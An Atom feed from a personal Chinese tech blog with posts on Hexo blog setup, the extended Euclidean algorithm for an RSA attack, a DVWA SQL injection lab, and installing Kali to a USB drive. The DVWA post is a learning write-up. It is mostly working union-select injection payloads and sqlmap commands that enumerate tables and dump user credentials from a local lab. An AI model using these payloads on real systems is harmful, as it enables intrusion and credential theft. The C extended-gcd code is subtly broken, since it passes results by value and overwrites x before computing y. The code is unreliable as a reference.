<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>mercer</title>
  
  
  <link href="/atom.xml" rel="self"/>
  
  <link href="https://mercer5.github.io/"/>
  <updated>2020-08-25T00:34:47.866Z</updated>
  <id>https://mercer5.github.io/</id>
  
  <author>
    <name>mercer</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>换台电脑搞blog</title>
    <link href="https://mercer5.github.io/2020/08/25/%E6%8D%A2%E5%8F%B0%E7%94%B5%E8%84%91%E6%90%9Eblog/"/>
    <id>https://mercer5.github.io/2020/08/25/%E6%8D%A2%E5%8F%B0%E7%94%B5%E8%84%91%E6%90%9Eblog/</id>
    <published>2020-08-25T00:31:35.000Z</published>
    <updated>2020-08-25T00:34:47.866Z</updated>
    
    <content type="html"><![CDATA[<h1 id="换台电脑搞blog"><a href="#换台电脑搞blog" class="headerlink" title="换台电脑搞blog"></a>换台电脑搞blog</h1><blockquote><p>很好,之前的预言中了,电脑重装后,啥都没了</p><p>从现在开始重新搭建blog所需的环境之类的东西</p><p>顺便记录一下,恢复过程</p><p>2020-8-24</p></blockquote><h2 id="下载"><a href="#下载" class="headerlink" title="下载"></a>下载</h2><ol><li>git</li><li>nodejs</li></ol><h2 id="连接"><a href="#连接" class="headerlink" title="连接"></a>连接</h2><ul><li>设置git全局邮箱和用户名</li></ul><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">git<span class="built_in"> config </span>--global user.name <span class="string">"yourgithubname"</span></span><br><span class="line">git<span class="built_in"> config </span>--global user.email <span class="string">"yourgithubemail"</span></span><br></pre></td></tr></table></figure><ul><li>设置ssh key</li></ul><figure class="highlight vala"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ssh-keygen -t rsa -C <span class="string">"youremail"</span></span><br><span class="line"><span class="meta">#生成后填到github</span></span><br></pre></td></tr></table></figure><ul><li>安装hexo</li></ul><figure class="highlight avrasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo npm install hexo-<span class="keyword">cli</span> -g</span><br></pre></td></tr></table></figure><p>但是已经不需要初始化了，</p><p>直接在任意文件夹下，</p><figure class="highlight crmsh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git <span class="keyword">clone</span> <span class="title">git</span>@………………</span><br></pre></td></tr></table></figure><p>然后进入克隆到的文件夹：</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-tag">cd</span> <span class="selector-tag">xxx</span><span class="selector-class">.github</span><span class="selector-class">.io</span></span><br><span class="line"><span class="selector-tag">npm</span> <span class="selector-tag">install</span> <span class="selector-tag">hexo-deployer-git</span> <span class="selector-tag">--save</span></span><br></pre></td></tr></table></figure><p>生成，部署：</p><figure class="highlight properties"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">hexo</span> <span class="string">g</span></span><br><span class="line"><span class="attr">hexo</span> <span class="string">d</span></span><br></pre></td></tr></table></figure><p>然后就可以开始写你的新博客了</p><figure class="highlight actionscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hexo <span class="keyword">new</span> newpage</span><br></pre></td></tr></table></figure><p>不要忘了，每次写完最好都把源文件上传一下</p><figure class="highlight avrasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">git <span class="keyword">add</span> .</span><br><span class="line">git commit –m <span class="string">"xxxx"</span></span><br><span class="line">git <span class="keyword">push</span></span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;换台电脑搞blog&quot;&gt;&lt;a href=&quot;#换台电脑搞blog&quot; class=&quot;headerlink&quot; title=&quot;换台电脑搞blog&quot;&gt;&lt;/a&gt;换台电脑搞blog&lt;/h1&gt;&lt;blockquote&gt;
&lt;p&gt;很好,之前的预言中了,电脑重装后,啥都没了&lt;/p&gt;
&lt;p&gt;
      
    
    </summary>
    
    
      <category term="blog" scheme="https://mercer5.github.io/categories/blog/"/>
    
    
      <category term="blog" scheme="https://mercer5.github.io/tags/blog/"/>
    
  </entry>
  
  <entry>
    <title>欧几里德算法及扩展算法</title>
    <link href="https://mercer5.github.io/2020/08/24/%E6%AC%A7%E5%87%A0%E9%87%8C%E5%BE%B7%E7%AE%97%E6%B3%95%E5%8F%8A%E6%89%A9%E5%B1%95%E7%AE%97%E6%B3%95/"/>
    <id>https://mercer5.github.io/2020/08/24/%E6%AC%A7%E5%87%A0%E9%87%8C%E5%BE%B7%E7%AE%97%E6%B3%95%E5%8F%8A%E6%89%A9%E5%B1%95%E7%AE%97%E6%B3%95/</id>
    <published>2020-08-24T15:30:09.857Z</published>
    <updated>2020-08-24T15:30:09.857Z</updated>
    
    <content type="html"><![CDATA[<h1 id="欧几里德算法及扩展算法"><a href="#欧几里德算法及扩展算法" class="headerlink" title="欧几里德算法及扩展算法"></a>欧几里德算法及扩展算法</h1><h2 id="欧几里得算法"><a href="#欧几里得算法" class="headerlink" title="欧几里得算法"></a>欧几里得算法</h2><p>又称碾转相除法，用于计算两整数a, b 的最大公约数。</p><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">int</span> max(int a, int b)</span><br><span class="line">&#123;</span><br><span class="line"><span class="attribute">int</span> c;</span><br><span class="line"><span class="attribute">c</span> = a % b;</span><br><span class="line"><span class="attribute">while</span> (c != <span class="number">0</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="attribute">a</span> = b;</span><br><span class="line"><span class="attribute">b</span> = c;</span><br><span class="line"><span class="attribute">c</span> = a % b;</span><br><span class="line">&#125;</span><br><span class="line"><span class="attribute">return</span> b;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>原理依赖于下面定理：</p><blockquote><p>两个整数的最大公约数等于其中较小的那个数和两数相除的最大公约数。</p></blockquote><p>证明：<br>设 a = kb +r， 则r = a mod b<br>假设d为a, b的一个公约数<br>r = kb - a<br>r/d = kb/d - a/d<br>可知r/d为整数，因此d也是a, b, a%b的公约数， 则得证。</p><h2 id="欧几里得扩展算法"><a href="#欧几里得扩展算法" class="headerlink" title="欧几里得扩展算法"></a>欧几里得扩展算法</h2><p>因为在学习RSA的共模攻击，所以复习一下欧几里得算法，但是关键是欧几里得算法扩展：</p><blockquote><p>如果gcd(a, b) = c，则存在x, y，使得c = ax + by。</p></blockquote><p>证明：</p><p>　　设 <code>a&gt;b</code><br>　　当 <code>b = 0</code>时，<code>gcd(a, b) = a</code>，此时<code>x = 1</code>, <code>y = 0</code>。<br>　　假设 <code>a*x1 + b*y1 = gcd(a, b)</code><br>　　则 <code>b*x2 + (a mod b)*y2 = gcd(b, a mod b)</code><br>　　根据 <code>gcd(a, b) = gcd(b, a mod b)</code>　　<br>　　可得 <code>a*x1 + b*y1 = b*x2 + (a mod b)*y2</code>　　<br>　　因为 <code>a mod b = a - (a/b)*b</code> //这里 ‘/‘ 是整除　　<br>　　所以 <code>a*x1 + b*y1 = b*x2 + (a - (a/b)*b)*y2</code><br>　　　　　　　　　　　<code>= b*x2 + a*y2 - (a/b)*b*y2</code><br>　　　　　　 <code>gcd(a, b) = a*y2 + b*(x2 - (a/b)*y2)</code><br>　　对比 <code>a*x1 + b*y1 = gcd(a, b)</code>　　<br>　　发现 <code>x1 = y2</code><br>　　　 　 <code>y1 = x2 - (a/b)*y2</code>　　</p><p>算法代码如下：</p><figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">int</span> e<span class="constructor">_gcd(<span class="params">int</span> <span class="params">a</span>, <span class="params">int</span> <span class="params">b</span>, <span class="params">int</span> <span class="params">x</span>, <span class="params">int</span> <span class="params">y</span>)</span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(b<span class="operator"> == </span><span class="number">0</span>)&#123;</span><br><span class="line">        x = <span class="number">1</span>;</span><br><span class="line">        y = <span class="number">0</span>;</span><br><span class="line">        return a;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">int</span> ans = e<span class="constructor">_gcd(<span class="params">b</span>, <span class="params">a</span>%<span class="params">b</span>, <span class="params">x</span>, <span class="params">y</span>)</span>;</span><br><span class="line">    <span class="built_in">int</span> t = x;</span><br><span class="line">    x = y;</span><br><span class="line">    y = x - (a/b)*y;</span><br><span class="line">    return ans;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="乘法逆元"><a href="#乘法逆元" class="headerlink" title="乘法逆元"></a>乘法逆元</h2><p><strong>什么叫乘法逆元？</strong></p><p>形如<code>a*x mod b ≡ 1</code><br>我们称x是a关于f的乘法逆元，还有另一种表达式：</p><figure class="highlight gml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">a*<span class="symbol">x</span> + b*<span class="symbol">y</span> = <span class="number">1</span></span><br></pre></td></tr></table></figure><p>也就是<code>gcd(a, b) = 1</code></p><p>在RSA共模攻击中，求乘法逆元函数如下</p><figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">def egcd(<span class="keyword">a</span>, b):</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">a</span> == <span class="number">0</span>:</span><br><span class="line">          <span class="literal">return</span> (b, <span class="number">0</span>, <span class="number">1</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        g, y, x = egcd(b % <span class="keyword">a</span>, <span class="keyword">a</span>)</span><br><span class="line">        <span class="literal">return</span> (g, x - (b<span class="comment"> // a) * y, y)</span></span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;欧几里德算法及扩展算法&quot;&gt;&lt;a href=&quot;#欧几里德算法及扩展算法&quot; class=&quot;headerlink&quot; title=&quot;欧几里德算法及扩展算法&quot;&gt;&lt;/a&gt;欧几里德算法及扩展算法&lt;/h1&gt;&lt;h2 id=&quot;欧几里得算法&quot;&gt;&lt;a href=&quot;#欧几里得算法&quot; cla
      
    
    </summary>
    
    
    
  </entry>
  
  <entry>
    <title>dvwa-sql-显注-low</title>
    <link href="https://mercer5.github.io/2020/04/15/%C2%96dvwa-sql-%E6%98%BE%E6%B3%A8-low/"/>
    <id>https://mercer5.github.io/2020/04/15/%C2%96dvwa-sql-%E6%98%BE%E6%B3%A8-low/</id>
    <published>2020-04-15T09:38:31.000Z</published>
    <updated>2020-08-24T15:30:09.779Z</updated>
    
    <content type="html"><![CDATA[<h1 id="dvwa-sql-显注-low"><a href="#dvwa-sql-显注-low" class="headerlink" title="dvwa-sql-显注-low"></a>dvwa-sql-显注-low</h1><blockquote><p>就拿dvwa学习一下sql的手工注入,以及sqlmap的使用</p><p>做些笔记</p></blockquote><h2 id="tip"><a href="#tip" class="headerlink" title="tip"></a>tip</h2><ol><li><p>concat_ws(1,2,3): 使用1作为连接符,连接2和3</p><p>方便从一个显示位,显示多种内容</p></li><li><p>char(32,58,32): char将其中的ascii值转成字符</p><p>这里是空格冒号空格</p><p>作为concat_ws使用,比较美观</p></li></ol><h2 id="low"><a href="#low" class="headerlink" title="low"></a>low</h2><p>源码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>( <span class="keyword">isset</span>( $_REQUEST[ <span class="string">'Submit'</span> ] ) ) &#123;</span><br><span class="line">    <span class="comment">// Get input</span></span><br><span class="line">    $id = $_REQUEST[ <span class="string">'id'</span> ];</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Check database</span></span><br><span class="line">    $query  = <span class="string">"SELECT first_name, last_name FROM users WHERE user_id = '$id';"</span>;</span><br><span class="line">    $result = mysqli_query($GLOBALS[<span class="string">"___mysqli_ston"</span>],  $query ) <span class="keyword">or</span> <span class="keyword">die</span>( <span class="string">'&lt;pre&gt;'</span> . ((is_object($GLOBALS[<span class="string">"___mysqli_ston"</span>])) ? mysqli_error($GLOBALS[<span class="string">"___mysqli_ston"</span>]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : <span class="keyword">false</span>)) . <span class="string">'&lt;/pre&gt;'</span> );</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Get results</span></span><br><span class="line">    <span class="keyword">while</span>( $row = mysqli_fetch_assoc( $result ) ) &#123;</span><br><span class="line">        <span class="comment">// Get values</span></span><br><span class="line">        $first = $row[<span class="string">"first_name"</span>];</span><br><span class="line">        $last  = $row[<span class="string">"last_name"</span>];</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Feedback for end user</span></span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"&lt;pre&gt;ID: &#123;$id&#125;&lt;br /&gt;First name: &#123;$first&#125;&lt;br /&gt;Surname: &#123;$last&#125;&lt;/pre&gt;"</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    mysqli_close($GLOBALS[<span class="string">"___mysqli_ston"</span>]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h3 id="手工注入"><a href="#手工注入" class="headerlink" title="手工注入"></a>手工注入</h3><ol><li><p>输入<code>&#39;</code>,发现有报错,说明很可能有sql注入</p></li><li><p><code>1&#39; order by 2#</code>猜解列数</p><p>order by后面加数字时,表示按第几列进行排序</p><p>如果没有那列的话,就会报错</p><p>该步的目的,是为了使用union select</p><p>因为union select 要求两者的列数相同,才能进行查询</p><p><img src="Snipaste_2020-04-15_10-48-47.png" alt="Snipaste_2020-04-15_10-48-47"></p><p><img src="Snipaste_2020-04-15_10-48-55.png" alt="Snipaste_2020-04-15_10-48-55"></p></li><li><p><code>1&#39; union select 1,2#</code>爆显示位</p><p>从输入中,可以发现,两个都能显示出来</p><p>也就是说,每次可以查询两个地方</p><p><img src="Snipaste_2020-04-15_10-51-10.png" alt="Snipaste_2020-04-15_10-51-10"></p></li><li><p><code>1&#39; union select version(),database()#</code></p><p>查询一下sql版本和当前数据库名称</p><p>sql版本很重要,因为版本&gt;(多少我忘了&gt;&lt;)时,会有一个<code>information_schema</code>数据库,里面有好多好多好东西</p><p><img src="Snipaste_2020-04-15_10-47-58.png" alt="Snipaste_2020-04-15_10-47-58"></p><p><code>1&#39; union select null,concat_ws(char(32,58,32),user(),database(),version())#</code></p><p>另一种方法,会在第二个显示位一起爆出用户、数据库及其版本信息</p><p><img src="Snipaste_2020-04-15_16-23-32.png" alt="Snipaste_2020-04-15_16-23-32"></p></li><li><p><code>1&#39; union select null,group_concat(table_name) from information_schema.tables where table_schema=&#39;dvwa&#39; #</code></p><p>版本比较大,所以有<code>information_schema</code>;得知数据库名后,就可以查表了</p><p><img src="Snipaste_2020-04-15_16-27-26.png" alt="Snipaste_2020-04-15_16-27-26"></p><p>可以看出dvwa中有两个表<code>guestbook</code>and<code>users</code></p><p>明显users重要点,所以下一步查users的列</p></li><li><p><code>1&#39; union select null,group_concat(column_name) from information_schema.columns where table_schema=&#39;dvwa&#39; and table_name=&#39;users&#39; #</code></p><p><img src="Snipaste_2020-04-15_16-38-54.png" alt="Snipaste_2020-04-15_16-38-54"></p><p>其中<code>user</code>和<code>password</code>看起来比较重要</p></li><li><p><code>1&#39; union select null, group_concat(concat_ws(char(32,58,32),user,password)) from users #</code></p><p><img src="Snipaste_2020-04-15_16-43-02.png" alt="Snipaste_2020-04-15_16-43-02"></p></li><li><p>如果不想显示在一条上,而是分开查询的话,把group_concat删了就行</p><ul><li><p>查表</p><p><code>1&#39; union select null,table_name from information_schema.tables where table_schema=&#39;dvwa&#39; #</code></p><p><img src="Snipaste_2020-04-15_16-46-11.png" alt="Snipaste_2020-04-15_16-46-11"></p></li><li><p>查列</p><p><code>1&#39; union select null,column_name from information_schema.columns where table_schema=&#39;dvwa&#39; and table_name=&#39;users&#39; #</code></p><p><img src="Snipaste_2020-04-15_16-46-27.png" alt="Snipaste_2020-04-15_16-46-27"></p></li><li><p>查内容</p><p><code>1&#39; union select null, concat_ws(char(32,58,32),user,password) from users #</code></p><p><img src="Snipaste_2020-04-15_16-46-37.png" alt="Snipaste_2020-04-15_16-46-37"></p></li></ul></li></ol><h3 id="sqlmap"><a href="#sqlmap" class="headerlink" title="sqlmap"></a>sqlmap</h3><ol><li><p>准备好网址</p><p>在id中输入1,是的url中包含参数名称</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="regexp">//</span>localhost<span class="regexp">/DVWA-master/</span>vulnerabilities<span class="regexp">/sqli/</span>?id=<span class="number">1</span>&amp;Submit=Submit<span class="comment">#</span></span><br></pre></td></tr></table></figure></li><li><p>准备好cookie</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">security</span>=low; <span class="attribute">PHPSESSID</span>=9v0e6li5s4iok70h3fi7al0gv1</span><br></pre></td></tr></table></figure></li><li><p>打开sqlmap,输入</p><figure class="highlight jboss-cli"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python sqlmap.py -u <span class="string">"http://localhost/DVWA-master/vulnerabilities/sqli/?id=1&amp;Submit=Submit#"</span> <span class="params">--cookie=</span><span class="string">"security=low; PHPSESSID=9v0e6li5s4iok70h3fi7al0gv1"</span> <span class="params">--batch</span></span><br></pre></td></tr></table></figure><p>康康有没有sql注入</p><ul><li>-u参数指定目标URL</li><li>–batch参数采用默认选项,不进行询问</li><li>–cookie参数指定cookie</li></ul><p>可以看到是存在注入的</p><p><img src="Snipaste_2020-04-15_17-13-57.png" alt="Snipaste_2020-04-15_17-13-57"></p></li><li><p>查看所有的数据库</p><figure class="highlight jboss-cli"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python sqlmap.py -u <span class="string">"http://localhost/DVWA-master/vulnerabilities/sqli/?id=1&amp;Submit=Submit#"</span> <span class="params">--cookie=</span><span class="string">"security=low; PHPSESSID=9v0e6li5s4iok70h3fi7al0gv1"</span> <span class="params">--batch</span> <span class="params">--dbs</span></span><br></pre></td></tr></table></figure><ul><li>–dbs所有数据库</li></ul><p><img src="Snipaste_2020-04-15_17-15-16.png" alt="Snipaste_2020-04-15_17-15-16"></p></li><li><p>所以我们要用的应该是dvwa那个库,然后康康里面有什么表</p><figure class="highlight jboss-cli"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python sqlmap.py -u <span class="string">"http://localhost/DVWA-master/vulnerabilities/sqli/?id=1&amp;Submit=Submit#"</span> <span class="params">--cookie=</span><span class="string">"security=low; PHPSESSID=9v0e6li5s4iok70h3fi7al0gv1"</span> <span class="params">--batch</span> -D dvwa <span class="params">--tables</span></span><br></pre></td></tr></table></figure><ul><li>-D参数指定为dvwa数据库</li><li>–tables参数查看所有的表</li></ul><p><img src="image-20200415171817802.png" alt="image-20200415171817802"></p></li><li><p>查看users表中的列</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python sqlmap.py -u <span class="string">"http://localhost/DVWA-master/vulnerabilities/sqli/?id=1&amp;Submit=Submit#"</span> <span class="attribute">--cookie</span>=<span class="string">"security=low; PHPSESSID=9v0e6li5s4iok70h3fi7al0gv1"</span> --batch -D dvwa -T<span class="built_in"> users </span>--columns</span><br></pre></td></tr></table></figure><ul><li>-T参数指定表为users</li><li>–columns查看该表的所有列</li></ul><p><img src="image-20200415172014493.png" alt="image-20200415172014493"></p></li><li><p>最后看看整个表中都有什么</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python sqlmap.py -u <span class="string">"http://localhost/DVWA-master/vulnerabilities/sqli/?id=1&amp;Submit=Submit#"</span> <span class="attribute">--cookie</span>=<span class="string">"security=low; PHPSESSID=9v0e6li5s4iok70h3fi7al0gv1"</span> --batch -D dvwa -T<span class="built_in"> users </span>--dump</span><br></pre></td></tr></table></figure><ul><li>–dump参数将所有列的信息都列出来</li></ul><p><img src="image-20200415172329770.png" alt="image-20200415172329770"></p></li></ol>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;dvwa-sql-显注-low&quot;&gt;&lt;a href=&quot;#dvwa-sql-显注-low&quot; class=&quot;headerlink&quot; title=&quot;dvwa-sql-显注-low&quot;&gt;&lt;/a&gt;dvwa-sql-显注-low&lt;/h1&gt;&lt;blockquote&gt;
&lt;p&gt;就拿dvw
      
    
    </summary>
    
    
      <category term="sql" scheme="https://mercer5.github.io/categories/sql/"/>
    
    
      <category term="sql" scheme="https://mercer5.github.io/tags/sql/"/>
    
  </entry>
  
  <entry>
    <title>带着kali一起走</title>
    <link href="https://mercer5.github.io/2020/04/10/%C2%96%E5%B8%A6%E7%9D%80kali%E4%B8%80%E8%B5%B7%E8%B5%B0/"/>
    <id>https://mercer5.github.io/2020/04/10/%C2%96%E5%B8%A6%E7%9D%80kali%E4%B8%80%E8%B5%B7%E8%B5%B0/</id>
    <published>2020-04-10T03:57:39.000Z</published>
    <updated>2020-08-24T15:30:09.789Z</updated>
    
    <content type="html"><![CDATA[<h1 id="带着kali一起走"><a href="#带着kali一起走" class="headerlink" title="带着kali一起走"></a>带着kali一起走</h1><blockquote><p>本来想装arch的来着,久仰邪教大名</p><p><code>┏┛墓┗┓...(((m -__-)m</code>,不愧是邪教</p><p>ubuntu也搞了好久,但是没成功</p><p>所以在kali这碰碰运气</p><p>没想到啊,除了一点小问题,竟然成功了</p><p>这里贴上我参考的blog: <a href="https://blog.51cto.com/zdzhu/1574543" target="_blank" rel="noopener">https://blog.51cto.com/zdzhu/1574543</a></p><p>下面,就大致记录一下过程,以及问题的解决</p></blockquote><h2 id="准备工作"><a href="#准备工作" class="headerlink" title="准备工作"></a>准备工作</h2><ol><li>kali镜像: 墙裂建议<a href="https://mirror.tuna.tsinghua.edu.cn/" target="_blank" rel="noopener">清华镜像站</a></li><li>vm: 去官网找一下吧,我的是15的</li><li>U盘: 我用的是SanDisk32G的</li></ol><h2 id="U盘的处理"><a href="#U盘的处理" class="headerlink" title="U盘的处理"></a>U盘的处理</h2><blockquote><p>这是我自己瞎鼓捣出来的,所以我不确定有什么后果,虽然最终是成功了的</p></blockquote><h3 id="经过"><a href="#经过" class="headerlink" title="经过"></a>经过</h3><p>就在我愉快的进行到最后一步时</p><p><strong>在SCSI3(0,0,0)(sda)设备的第1分区上创建ext4文件系统失败</strong></p><p>To be continue……</p><p>然后,我寻思着,整个安装过程都没什么我可以瞎几把乱点的地方</p><p>然后我看看因为装arch,装ubuntu,格式化了2次的U盘</p><p>再看看报错说: 创建ext4<strong>文件系统</strong>失败</p><p>在格式化U盘时,一直是默认的fat32<strong>文件系统</strong></p><p>我觉得我可以换一种试试,比如<strong>exfat</strong></p><p>然后意外的成了!!!</p><h3 id="格式化"><a href="#格式化" class="headerlink" title="格式化"></a>格式化</h3><ol><li><p>此电脑</p></li><li><p>在U盘处右键,选择<strong>格式化</strong></p><p><img src="Snipaste_2020-04-10_00-17-37.png" alt="Snipaste_2020-04-10_00-17-37"></p></li><li><p>设置文件系统为<strong>exfat</strong></p><p><img src="Snipaste_2020-04-09_16-30-27.png" alt="Snipaste_2020-04-09_16-30-27"></p></li></ol><h2 id="创建虚拟机"><a href="#创建虚拟机" class="headerlink" title="创建虚拟机"></a>创建虚拟机</h2><ol><li><p>创建新的虚拟机,选择典型</p><p><img src="Snipaste_2020-04-09_16-13-27.png" alt="Snipaste_2020-04-09_16-13-27"></p></li><li><p>选第二个,浏览找到你所下载的镜像文件</p><p><img src="Snipaste_2020-04-09_16-14-15.png" alt="Snipaste_2020-04-09_16-14-15"></p></li><li><p>linux,版本我就乱选了&gt;&lt;</p><p><img src="Snipaste_2020-04-09_16-14-59.png" alt="Snipaste_2020-04-09_16-14-59"></p></li><li><p>你可以给你的虚拟机取一个好听的名字,放在一个你能找到的位置</p><p>毕竟它命不久矣</p><p><img src="Snipaste_2020-04-09_16-16-04.png" alt="Snipaste_2020-04-09_16-16-04"></p></li><li><p>分配磁盘空间,这里可以乱搞</p><p><img src="Snipaste_2020-04-09_16-17-46.png" alt="Snipaste_2020-04-09_16-17-46"></p></li><li><p>这样就好了</p></li></ol><h2 id="虚拟机的配置"><a href="#虚拟机的配置" class="headerlink" title="虚拟机的配置"></a>虚拟机的配置</h2><ol><li>单击“编辑虚拟机设置”</li></ol><p><img src="wKioL1Re6FvyXY59AAEB5AV5vKQ372.jpg" alt="wKioL1Re6FvyXY59AAEB5AV5vKQ372.jpg"></p><ol start="2"><li>选择硬盘，然后单击下面的“移除”，然后单击“确定”。</li></ol><p><img src="wKioL1Re6FuCaDs7AAGWORRZME8348.jpg" alt="wKioL1Re6FuCaDs7AAGWORRZME8348.jpg"></p><h2 id="装系统进U盘"><a href="#装系统进U盘" class="headerlink" title="装系统进U盘"></a>装系统进U盘</h2><blockquote><p>这里我是粘贴了上面记载的博客的内容</p><p>然后针对我和他不一样的地方进行注释</p></blockquote><ol><li>将U盘或者移动硬盘插到PC上</li><li>在Vmware中运行刚刚创建后的虚拟机。</li><li>虚拟机运行后单击右下角的移动设备挂载按键，如下红色框所示。</li></ol><p><img src="wKiom1Re7Nyx59VvAAFjcAthyVE334.jpg" alt="wKiom1Re7Nyx59VvAAFjcAthyVE334.jpg"></p><ol start="4"><li>选择如下红框内容。</li></ol><p><img src="wKioL1Re7WPAvHOOAABTGEcUUw0628.jpg" alt="wKioL1Re7WPAvHOOAABTGEcUUw0628.jpg"></p><ol start="5"><li>在下面弹出的对话框中单击确定，此时移动设备会挂载到虚拟机下，Windows下将暂时看不到这个设备。</li></ol><p><img src="wKioL1Re7bbw08-aAACk6_CZoaE473.jpg" alt="wKioL1Re7bbw08-aAACk6_CZoaE473.jpg"></p><ol start="6"><li>选择图形化安装Kali。然后按回车键。</li></ol><p><img src="wKioL1Re7gvwAJPEAAECKN4L6LY399.jpg" alt="wKioL1Re7gvwAJPEAAECKN4L6LY399.jpg"></p><ol start="7"><li>步骤6结束后会让你选择系统语言、键盘语言、主机名、root密码等</li></ol><hr><p><strong>注意!!!</strong></p><p>第7步,键盘语言,务必选择<strong>英语(美国)</strong></p><p>我好像选错了,选成英语(英国)了,结果有些按键对不上</p><p>eg:<code>@</code>—&gt;<code>&quot;</code>,<code>&quot;</code>—&gt;<code>@</code>, <code>#</code>—&gt;一个我打不出来的东西</p><p>如果选错了,可以拉到下面的<strong>问题</strong>处</p><p>第8步,我的和那个博客的大佬的不大一样,没有第一个选项</p><p>所以直接使用默认,即<strong>向导 - 使用整个磁盘</strong></p><hr><ol start="8"><li>设置完root密码后，安装界面最后会停到“磁盘分区”界面如下。这里建议选择默认“使用最多的连续空闲空间”。然后单击继续。</li></ol><p><img src="wKiom1Re7aSwR1oeAAEn-52ZjS4680.jpg" alt="wKiom1Re7aSwR1oeAAEn-52ZjS4680.jpg"></p><ol start="9"><li>这里会发现你的移动设备被扫描到了。建议大家选择“将所有文件放在一个分区中”。</li></ol><p><img src="wKioL1Re7gyiUZ0AAAENvyGLgoI864.jpg" alt="wKioL1Re7gyiUZ0AAAENvyGLgoI864.jpg"></p><ol start="10"><li>系统会自动给您创建一个分区，如下。选择“分区设定结束并将修改写入磁盘”。此时正式的安全就开始了。时间估计在20分钟左右。</li></ol><p>在此过程中还会让设置几个选项，一个是“网络镜像”建议选否，一个是“将GRUB启动引导器安装到主引导记录（MBR）上，一定选“是”。</p><p><img src="wKiom1Re7aTBw8A3AAE_Gi5OlLc587.jpg" alt="wKiom1Re7aTBw8A3AAE_Gi5OlLc587.jpg"></p><ol start="11"><li>安装完成后单击“继续”此时系统会重启，由于Vmware重启后不会自动挂载移动设备，所以无法进入到刚刚安装完毕的系统中。不过此时已经不重要了，因为系统已经安装到移动设备中。单击“关闭客户机”关闭虚拟机。然后拔下移动硬盘或者U盘，快去重启PC然后选择USB启动试试，看看是否OK！</li></ol><p><img src="wKioL1Re7gzgKrOGAAC7YqvuJ7o544.jpg" 